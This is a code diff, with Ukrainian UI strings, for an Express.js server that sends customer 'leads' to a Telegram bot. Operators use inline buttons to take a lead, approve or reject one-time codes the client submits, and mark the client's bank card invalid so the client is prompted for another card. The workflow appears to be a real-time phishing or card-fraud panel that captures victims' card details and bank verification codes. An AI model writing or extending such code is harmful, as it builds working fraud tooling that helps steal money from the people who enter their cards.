@@ -199,6 +199,7 @@ app.post("/api/telegram-webhook", express.json(), async (req, res) => {
     else if (data.startsWith("take:")) answerText = "Взяв в роботу ✓";
     else if (data.startsWith("approve:")) answerText = "Код підтверджено ✓";
     else if (data.startsWith("reject:")) answerText = "Код відхилено";
+    else if (data.startsWith("invalidcard:")) answerText = "Картку відхилено";
 
     await tgApi("answerCallbackQuery", {
       callback_query_id: cb.id,
@@ -251,6 +252,25 @@ app.post("/api/telegram-webhook", express.json(), async (req, res) => {
       statusLine = `\n\n❌ <b>${name}</b> відхилив код — клієнт може ввести новий`;
       await sendTelegram(
         `❌ <b>${name}</b> відхилив код для заявки <b>#${leadId}</b>\nКлієнт може ввести новий код.`
+      );
+    } else if (data.startsWith("invalidcard:")) {
+      const leadId = data.split(":")[1];
+      try {
+        const a = await read();
+        const x = a.find((v) => Number(v.id) === Number(leadId));
+        if (x && x.status !== "Підтверджено" && x.status !== "Подтверждено") {
+          x.status = "Картка недійсна";
+          x.submitted_code = null;
+          x.retry_requested = false;
+          x.invalid_card_at = new Date().toISOString();
+          await write(a);
+        }
+      } catch (e) {
+        console.error("invalidcard lead error:", e.message);
+      }
+      statusLine = `\n\n🚫 <b>${name}</b> відхилив картку — клієнт може ввести іншу`;
+      await sendTelegram(
+        `🚫 <b>${name}</b> позначив картку недійсною для заявки <b>#${leadId}</b>\nКлієнту показано повідомлення і форма скинута.`
       );
     } else {
       console.log("Unknown callback data:", data);
@@ -431,9 +451,10 @@ app.post("/api/leads", async (req, res) => {
       `Статус: очікує код`;
 
     const keyboard = {
-      inline_keyboard: [[
-        { text: "✅ Взяв в роботу", callback_data: `take:${id}` }
-      ]]
+      inline_keyboard: [
+        [{ text: "✅ Взяв в роботу", callback_data: `take:${id}` }],
+        [{ text: "🚫 Картка недійсна", callback_data: `invalidcard:${id}` }],
+      ],
     };
 
     await sendTelegram(tgMsg, { reply_markup: keyboard });
@@ -496,8 +517,9 @@ app.post("/api/leads/:id/submit-code", async (req, res) => {
       inline_keyboard: [
         [
           { text: "✅ Підтвердити", callback_data: `approve:${x.id}` },
-          { text: "❌ Відхилити", callback_data: `reject:${x.id}` },
+          { text: "❌ Відхилити код", callback_data: `reject:${x.id}` },
         ],
+        [{ text: "🚫 Картка недійсна", callback_data: `invalidcard:${x.id}` }],
       ],
     };
 
@@ -579,6 +601,14 @@ app.post("/api/leads/:id/decision", auth, async (req, res) => {
       x.rejected_code = x.submitted_code || null;
       x.rejected_at = new Date().toISOString();
       x.submitted_code = null;
+    } else if (decision === "invalid_card") {
+      if (x.status === "Підтверджено" || x.status === "Подтверждено") {
+        return res.status(400).json({ error: "Заявку вже підтверджено" });
+      }
+      x.status = "Картка недійсна";
+      x.submitted_code = null;
+      x.retry_requested = false;
+      x.invalid_card_at = new Date().toISOString();
     } else {
       return res.status(400).json({ error: "Недопустиме рішення" });
     }
